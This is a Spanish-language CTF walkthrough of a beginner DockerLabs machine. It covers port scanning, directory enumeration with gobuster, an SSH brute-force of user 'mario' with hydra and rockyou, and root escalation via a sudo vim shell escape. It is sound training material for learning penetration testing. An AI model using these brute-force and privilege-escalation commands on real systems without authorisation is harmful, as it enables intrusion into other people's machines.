---
Estado: Completado
Plataforma: DockerLabs
SO: Linux
Dificultad: Muy Facil
VectorInicial: Fuerza bruta SSH
Privesc: Sudo vim
Fecha: 2026-02-04
---
<img width="916" height="556" alt="Pasted image 20260204102207" src="https://github.com/user-attachments/assets/342001e1-3ffc-4e36-9aa7-52793bbdd4ca" />

Lo primero que realizaremos sera un escaneo para ver que puertos y servicios tiene abiertos.

```bash
nmap -sSVC 172.18.0.2
```

Con este comando obtenemos el siguiente resultado:

<img width="760" height="366" alt="Pasted image 20260204102554" src="https://github.com/user-attachments/assets/cab7691c-203f-4c6a-b7be-013a3bcdef2f" />

Esto nos indica que tenemos 2 puertos abiertos

- 22: puerto para comunicaciones SSH
- 80: puerto para servicios web

Por el momento miraremos que hay en la web.

<img width="824" height="562" alt="Pasted image 20260204102833" src="https://github.com/user-attachments/assets/d9e065d0-72a1-459e-8d21-e202b34ec39f" />

Vemos que solo hay una pagina por defecto de la instalación de Apache así que tendremos que realizar un descubrimiento de archivos y directorios la web.

```bash
dirb http://172.18.0.2
```

Con **dirb** no hemos obtenido resultados así que usaremos **gobuster** para usar un diccionario y así ver si encontramos algo interesante.

```bash
gobuster dir -u http://172.18.0.2/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

Pero no encontramos directorios así que buscaremos ficheros.

```bash
gobuster dir -u http://172.18.0.2/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,html
```

Con este comando si encontramos algo mas.

<img width="939" height="351" alt="Pasted image 20260204104210" src="https://github.com/user-attachments/assets/c5157987-4812-48f4-8a83-6b6906c27dca" />

Pero no obtenemos nada al acceder a *secret.php*.

<img width="363" height="178" alt="Pasted image 20260204104332" src="https://github.com/user-attachments/assets/b7aef5e0-1066-4907-a8bb-df0c5f4d0a74" />

Esto nos da a pensar que existe un usuario llamado *mario* y como el puerto 22 esta abierto es posible que podamos usar un ataque de diccionario para acceder al sistema.

```bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt 172.18.0.2 -t 5 ssh
```

Después de esperar un rato obtenemos el resultado esperado:

<img width="1273" height="175" alt="Pasted image 20260204105015" src="https://github.com/user-attachments/assets/459c29a9-b0e9-4903-a0ae-7eebda117567" />

Ahora solo tenemos que conectarnos al servidor para continuar con nuestra tarea.

```bash
ssh mario@172.18.0.2
```

<img width="810" height="285" alt="Pasted image 20260204105158" src="https://github.com/user-attachments/assets/b2236e04-b700-46b6-a1e4-fae3336fd5a6" />

Una vez dentro del sistema solo tenemos que buscar la forma de escalar privilegios para ser *root*.

Con el comando ***sudo -l*** obtenemos un dato que nos puede facilitar la labor de escalar privilegios.

<img width="952" height="114" alt="Pasted image 20260204105726" src="https://github.com/user-attachments/assets/71492b0b-e9ac-462d-bf2e-0aa183fe36ac" />

Ahora buscaremos en la web https://gtfobins.org/ para encontrar el método correcto.

```bash
sudo vim -c ':!/bin/bash'
```

Cabe destacar que este comando no es 100% de la web ya que en la web hacen referencia al uso de ***vi*** pero nosotros solo tenemos que cambiar el nombre del ejecutable para que funcione.

<img width="841" height="141" alt="Pasted image 20260204110501" src="https://github.com/user-attachments/assets/46a13fa8-c34f-4d03-a130-269ae9136ea7" />

## Conclusión

Con este laboratorio aprendemos a buscar mas aya de lo evidente en los directorios y ficheros de una web.

Así mismo vemos una mala gestión de los privilegios del comando **sudo** con la aplicación de **vim** nos da acceso a conseguir acceso como administrador.

Este tipo de errores hay que evitarlos ya que pueden llevar a grandes problemas.
